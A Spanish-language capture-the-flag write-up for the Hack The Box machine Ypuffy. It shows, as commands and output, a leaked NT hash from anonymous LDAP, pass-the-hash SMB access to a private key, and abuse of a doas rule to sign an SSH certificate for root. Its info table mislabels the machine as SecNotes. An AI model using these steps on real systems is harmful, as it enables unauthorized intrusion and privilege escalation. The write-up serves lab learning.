---
title: "HTB write-up: Ypuffy"
date: 2019-02-09T10:36:18-06:00
tags: ["hackthebox","htb","boot2root","pentesting","ctf"]
categories: ["htb","pentesting"]
draft: false

---

Sin duda una de las cosas que mas me gusta de HTB, es el hecho de tener un ecosistema tan variado que permite aprender en horizontales y verticales. Esta máquina me ayudo a conocer como funciona la generación de llaves de SSH a gran escala y como una mala configuración nos puede llevar a entregarle root a cualquier usuario. Tampoco conocía DOAS, pero se me hizo gracioso como fue relativamente fácil homologar lo aprendido de SUDO y RUNAS. 

Sin mas vamos con el write up...

<!--more-->

# Machine info

La información que tenemos de la máquina es:

Name     | Maker     | OS    | IP Address 
---      | ---       | ---   | ---
SecNotes | AuxSarge  | Other | 10.10.10.107

Su tarjeta de presentación es: 

![Card Info](/img/htb-ypuffy/cardinfo.png)

# Port Scanning

Comenzamos por escanear todos los puertos TCP abiertos en la máquina, con la finalidad de poder encontrar los servicios ejecutándose en la máquina:

Primero un nmap de todos los puertos, sin resolución de dns y un haciendo un TCP syn scan:

```
root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.107                                                                                  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:16 CST                                                                        
Initiating Ping Scan at 11:16                                                                                                          
Scanning 10.10.10.107 [4 ports]                                                                                                        
Completed Ping Scan at 11:16, 0.43s elapsed (1 total hosts)                                                                            
Initiating SYN Stealth Scan at 11:16                                                                                                   
Scanning 10.10.10.107 [65535 ports]                                       
Discovered open port 139/tcp on 10.10.10.107
Discovered open port 445/tcp on 10.10.10.107
Discovered open port 80/tcp on 10.10.10.107
Discovered open port 22/tcp on 10.10.10.107
Discovered open port 389/tcp on 10.10.10.107
Completed SYN Stealth Scan at 11:19, 122.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.107
Host is up (0.21s latency).
Not shown: 64940 closed ports, 590 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 123.17 seconds
           Raw packets sent: 150935 (6.641MB) | Rcvd: 129858 (5.194MB)
```

Como backup a algún puerto coqueto que se haya hecho pasar por filtrado, realizamos un masscan:

```
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.107

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 19:17:52 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 139/tcp on 10.10.10.107                                   
Discovered open port 445/tcp on 10.10.10.107                                   
Discovered open port 80/tcp on 10.10.10.107                                    
Discovered open port 22/tcp on 10.10.10.107                                    
Discovered open port 389/tcp on 10.10.10.107
```

Observamos consistencia, por lo que continuamos a analizar los servicios y versiones en cada puerto:

```
root@laptop:~# nmap -p22,80,139,389,445 -sV -sC -n -v 10.10.10.107                                                                     
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 17:35 CST                                                                        
NSE: Loaded 148 scripts for scanning.                                                                                                  
NSE: Script Pre-scanning.                                                                                                              
Initiating NSE at 17:35                                                                                                                
Completed NSE at 17:35, 0.00s elapsed                                                                                                  
Initiating NSE at 17:35                                                                                                                
Completed NSE at 17:35, 0.00s elapsed                                                                                                  
Initiating Ping Scan at 17:35                                                                                                          
Scanning 10.10.10.107 [4 ports]                                                                                                        
Completed Ping Scan at 17:35, 0.43s elapsed (1 total hosts)                                                                            
Initiating SYN Stealth Scan at 17:35                                                                                                   
Scanning 10.10.10.107 [5 ports]                                                                                                        
Discovered open port 445/tcp on 10.10.10.107                                                                                           
Discovered open port 22/tcp on 10.10.10.107                                                                                            
Discovered open port 80/tcp on 10.10.10.107                                                                                            
Discovered open port 139/tcp on 10.10.10.107
Discovered open port 389/tcp on 10.10.10.107
Completed SYN Stealth Scan at 17:35, 0.43s elapsed (5 total ports)
Initiating Service scan at 17:35
Scanning 5 services on 10.10.10.107
Completed Service scan at 17:36, 15.00s elapsed (5 services on 1 host)                                                                
NSE: Script scanning 10.10.10.107.
Initiating NSE at 17:36
Completed NSE at 17:36, 12.88s elapsed
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Nmap scan report for 10.10.10.107
Host is up (0.21s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY
                                                                                                                                      
Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2019-01-02T18:36:10-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication\_level: user
|   challenge\_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-01-02 17:36:10
|_  start\_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.32 seconds
           Raw packets sent: 9 (372B) | Rcvd: 6 (248B)
```

Con este primer vistazo ya tenemos en nombre de la máquina, el dominio y un poco de información contradictoria (banner httpd de openbsd y smb-os de Windows 6.1)

# LDAP

Continuemos por enumerar el servicio de LDAP con el script de nmap:

```
root@laptop:~# nmap -p389 10.10.10.107 -sC -sV --script ldap-search                                                                    
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 18:24 CST                                                                        
Nmap scan report for 10.10.10.107                                                                                                      
Host is up (0.18s latency).                                                                                                            
                                                                                                                                       
PORT    STATE SERVICE VERSION                                                                                                          
389/tcp open  ldap    (Anonymous bind OK)                                                                                              
| ldap-search:                                                                                                                         
|   Context: dc=hackthebox,dc=htb                                                                                                      
|     dn: dc=hackthebox,dc=htb                                                                                                         
|         dc: hackthebox                                                                                                               
|         objectClass: top                                                                                                             
|         objectClass: domain                                                                                                          
|     dn: ou=passwd,dc=hackthebox,dc=htb                                                                                               
|         ou: passwd                                                                                                                   
|         objectClass: top                                                                                                             
|         objectClass: organizationalUnit                                                                                              
|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb                                                                                   
|         uid: bob8791                                                                                                                 
|         cn: Bob                                                                                                                      
|         objectClass: account                                                                                                         
|         objectClass: posixAccount                                                                                                    
|         objectClass: top
|         userPassword: {BSDAUTH}bob8791
|         uidNumber: 5001
|         gidNumber: 5001
|         gecos: Bob
|         homeDirectory: /home/bob8791
|         loginShell: /bin/ksh
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
|         sambaPwdLastSet: 1532916644
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: bob8791
|         userPassword: {crypt}*
|         gidNumber: 5001
|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: alice1978
|         userPassword: {crypt}*
|         gidNumber: 5000
|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
|         sambaDomainName: YPUFFY
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
|         sambaAlgorithmicRidBase: 1000
|         objectclass: sambaDomain
|         sambaNextUserRid: 1000
|         sambaMinPwdLength: 5
|         sambaPwdHistoryLength: 0
|         sambaLogonToChgPwd: 0
|         sambaMaxPwdAge: -1
|         sambaMinPwdAge: 0
|         sambaLockoutDuration: 30
|         sambaLockoutObservationWindow: 30
|         sambaLockoutThreshold: 0
|         sambaForceLogoff: -1
|         sambaRefuseMachinePwdChange: 0
|_        sambaNextRid: 1001

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

_Wow wow, slow down bro._

Tenemos ahora:

- El DC, hackthebox.htb
- Dos OU, group y passwd
- Dos UID, bob8791 (5001.5001) y alice1978 (5000.5000)
- Un NT Password from OU passwd, alice1978 / 0B186E661BBDBDCF6047784DE8B9FD8B

# SMB

Usemos estas credenciales ahora para enumerar el servicio de SMB:

```
(CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107 
SMB         10.10.10.107    445    YPUFFY           [*] Windows 6.1 (name:YPUFFY) (domain:ypuff) (signing:False) (SMBv1:True)
SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B 

(CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107 --shares
SMB         10.10.10.107    445    YPUFFY           [*] Windows 6.1 (name:YPUFFY) (domain:ypuff) (signing:False) (SMBv1:True)
SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B 
SMB         10.10.10.107    445    YPUFFY           [+] Enumerated shares
SMB         10.10.10.107    445    YPUFFY           Share           Permissions     Remark
SMB         10.10.10.107    445    YPUFFY           -----           -----------     ------
SMB         10.10.10.107    445    YPUFFY           alice           READ,WRITE      Alice's Windows Directory
SMB         10.10.10.107    445    YPUFFY           IPC$                            IPC Service (Samba Server)
```

Vientos, ahora tenemos el acceso al directorio de ALICE, analicemos su contenido:

```
(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py -hashes 00000000000000000000000000000000:0B186E661BBDBD
CF6047784DE8B9FD8B YPUFF/alice1978@10.10.10.107                                                                                        
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies                                                                  
                                                                                                                                       
Type help for list of commands                                                                                                         
# info                                                                                                                                 
Version Major: 6                                                                                                                       
Version Minor: 1                                                                                                                       
Server Name: YPUFFY                                                                                                                    
Server Comment: Samba Server                                                                                                           
Server UserPath: C:\                                                                                                                   
Simultaneous Users: 4294967295                                                                                                         
# use alice                                                                                                                            
# ls                                                                                                                                   
drw-rw-rw-          0  Wed Jan  2 19:09:09 2019 .                                                                                      
drw-rw-rw-          0  Tue Jul 31 22:16:50 2018 ..                                                                                     
-rw-rw-rw-       1460  Mon Jul 16 20:38:51 2018 my_private_key.ppk                                                                     
# get my_private_key.ppk                                                                                                               
# exit
```

# PPK File and login
Ok, tenemos un archivo ppk, que después de googlear, veremos que es un formato usado en putty para manera llaves, por lo que descomponemos el archivo para usarlo en openssh. Tras convertirlo, usemos la llave privada para acceder a la cuenta de alice:

```
xbytemx@laptop:~/htb/ypuff$ puttygen my_private_key.ppk -O private-openssh -o id_rsa-ypuff
xbytemx@laptop:~/htb/ypuff$ chmod 600 id_rsa-ypuff 
xbytemx@laptop:~/htb/ypuff$ ssh alice1978@10.10.10.107 -i id_rsa-ypuff 
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ 
```

# cat user.txt

`ypuffy$ cat user.txt`

# At bob8791

Después de una rápida revisión en los alrededores de alice, empezamos a espiar que hay con bob (me siento como si fuera eve):

> Como dato curioso, bob8791 y alice1978, hacen referencia a los personajes ficticios que fueron inventados para el artículo de "A method for obtaining digital signatures and public-key cryptosystems." en 1978!

```
ypuffy$ cd /home/bob8791
ypuffy$ ls -lah                                                                                                                        
total 36                                                                                                                               
drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 .                                                                                   
drwxr-xr-x  5 root     wheel     512B Jul 30 21:05 ..                                                                                  
-rw-r--r--  1 bob8791  bob8791    87B Mar 24  2018 .Xdefaults
-rw-r--r--  1 bob8791  bob8791   771B Mar 24  2018 .cshrc
-rw-r--r--  1 bob8791  bob8791   101B Mar 24  2018 .cvsrc
-rw-r--r--  1 bob8791  bob8791   359B Mar 24  2018 .login
-rw-r--r--  1 bob8791  bob8791   175B Mar 24  2018 .mailrc
-rw-r--r--  1 bob8791  bob8791   215B Mar 24  2018 .profile
drwxr-xr-x  2 bob8791  bob8791   512B Jul 30 20:53 dba
ypuffy$ cd dba
ypuffy$ ls -lah
total 12
drwxr-xr-x  2 bob8791  bob8791   512B Jul 30 20:53 .
drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 ..
-rw-r--r--  1 bob8791  bob8791   268B Jul 30 20:58 sshauth.sql
```

# sshauth.sql

Interesante, sshauth.sql. Veamos en que consiste este archivo:

```
ypuffy$ strings sshauth.sql                                                                                                           
CREATE TABLE principals (
        uid text,
        client cidr,
        principal text,
        PRIMARY KEY (uid,client,principal)
CREATE TABLE keys (
        uid text,
        key text,
        PRIMARY KEY (uid,key)
grant select on principals,keys to appsrv;
```

Básicamente vemos que crea las tablas de principals y keys, y se le otorga acceso a appsrv para que pueda usarlos.

# Config files

Veamos que hay en algunos archivos de configuración para hacernos una mejor idea de que realiza esta máquina.

## doas

Veamos que podemos hacer como otros usuarios desde alice:

```
ypuffy$ cat /etc/doas.conf
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

Así que por lo visto alice puede ejecutar ssh-keygen como userca, utilizaremos esta información esto más tarde.

## httpd

¿Se acuerdan que aun teníamos el servicio TCP/80 sin enumerar? Pues bien, ya como alice podemos investigar un poco mas:

```
ypuffy$ cat /etc/httpd.conf 
server "ypuffy.hackthebox.htb" {
        listen on * port 80

        location "/userca*" {
                root "/userca"
                root strip 1
                directory auto index
        }

        location "/sshauth*" {
                fastcgi socket "/run/wsgi/sshauthd.socket"
        }

        location * {
                block drop
        }
}
ypuffy$
```

Con razón mi gobuster fallo, todo lo que no fuera userca y sshauth se iba a drop. userca tiene un tema interesante, como vemos sirve para compartir el contenido del directorio. sshauth llama a un socket, si recordamos sshauth también era el nombre del archivo SQL que encontramos antes.

## SSHd

Realizamos un pequeño filtro para tomar la información relevante:

```
ypuffy$ cat /etc/ssh/sshd_config  | grep -vE "^#|^$"
PermitRootLogin prohibit-password
AuthorizedKeysFile      .ssh/authorized_keys
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u                                              
AuthorizedKeysCommandUser nobody
TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u                                  
AuthorizedPrincipalsCommandUser nobody
PasswordAuthentication no
ChallengeResponseAuthentication no
AllowAgentForwarding no
AllowTcpForwarding no
X11Forwarding no
Subsystem       sftp    /usr/libexec/sftp-server
```

Root solo puede entrar con certificados, no hay autenticación con contraseñas ni challenges, no hay fwd de ningún tipo.

También solo las llaves en .ssh/authorized\_keys son las validas, pero el usuario nobody puede autorizar via el servicio web (/run/wsgi/sshauthd.socket) pasando los argumentos de tipo keys t el usuario que solicita.

Principals, usa el mismo servicio vía HTTPd, cambiando el tipo a principals.

## CA keys

Como pudimos ver en el archivo de SSHd, las llaves de CA se encuentran en el home de userca:

```
ypuffy$ ls -lah /home/userca/                                                                                                                                                                
total 44
drwxr-xr-x  3 userca  userca   512B Jul 30  2018 .
drwxr-xr-x  5 root    wheel    512B Jul 30  2018 ..
-rw-r--r--  1 userca  userca    87B Jul 30  2018 .Xdefaults
-rw-r--r--  1 userca  userca   771B Jul 30  2018 .cshrc
-rw-r--r--  1 userca  userca   101B Jul 30  2018 .cvsrc
-rw-r--r--  1 userca  userca   359B Jul 30  2018 .login
-rw-r--r--  1 userca  userca   175B Jul 30  2018 .mailrc
-rw-r--r--  1 userca  userca   215B Jul 30  2018 .profile
drwx------  2 userca  userca   512B Jul 30  2018 .ssh
-r--------  1 userca  userca   1.6K Jul 30  2018 ca
-r--r--r--  1 userca  userca   410B Jul 30  2018 ca.pub
```

Esto significa que cualquier usuario puede preguntar por la lista de principals, y usarlo para otorgar accesos teniendo los privilegios adecuados hacia el archivo CA (doas). Y eso es precisamente lo que haremos.

# Abusing SSH CA

## Creating new pair of rsa key

Comenzamos por generar unas llaves RSA como alice:

```
ypuffy$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/alice1978/.ssh/id_rsa): /tmp/.miu/meh
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /tmp/.miu/meh.
Your public key has been saved in /tmp/.miu/meh.pub.                                                                                                                                                              
The key fingerprint is:
SHA256:h/p3lA1K73dZtbbhz3UhGChRcIZ7wMpilfHW1f2FCi0 alice1978@ypuffy.hackthebox.htb
The key's randomart image is:
+---[RSA 2048]----+
|     .+o++ o. .. |
|     o.+= E .....|
|    o .+oo + .  o|
|   o o...o. =   o|
|  . .   S..+ = .o|
|       . .. + o+o|
|      .    o  o B|
|       .  . o .=+|
|        .. . . .+|
+----[SHA256]-----+
ypuffy$ ls -lah
total 28
drwxrwxrwx  2 alice1978  wheel   512B Jan  9 03:15 .
drwxrwxrwt  8 root       wheel   512B Jan  9 03:10 ..
-rw-------  1 alice1978  wheel   1.6K Jan  9 03:14 meh
-rw-r--r--  1 alice1978  wheel   413B Jan  9 03:14 meh.pub
ypuffy$ chmod 777 meh.pub
```

Al final hice accesible mi llave publica meh para cualquiera.

## Security zone of root

Como queremos saber en que zona de seguridad esta el usuario root, por lo que usamos localmente la validación que aprendimos por sshd y ejecutamos como cualquier usuario curl 

```
ypuffy$ /usr/local/bin/curl 'http://127.0.0.1/sshauth?type=principals&username=root'
3m3rgencyB4ckd00r
```

Ya tenemos la zona, ahora pasemos al firmado.

## Signing key to trusted CA

Como hemos visto, el archivo de CA solo podía ser accedido por el usuario userca, por lo que tomando en cuenta las capacidades de DOAS, firmamos nuestro certificado para que tenga acceso a la misma zona de root.

```
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I miau3 -n 3m3rgencyB4ckd00r -z 1 /tmp/.miu/meh.pub 
Signed user key /tmp/.miu/meh-cert.pub: id "miau3" serial 1 for 3m3rgencyB4ckd00r valid forever
```

Finalmente, ingresamos como root usando el certificado que acabamos de autorizar.

# login as root

```
ypuffy$ ssh root@127.0.0.1 -i meh
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy# id                                                                                                                                                                                                      
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
ypuffy# ls
.Xdefaults .cache     .cshrc     .cvsrc     .login     .profile   root.txt
```

# cat root.txt

`ypuffy# cat root.txt`

... We got root flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
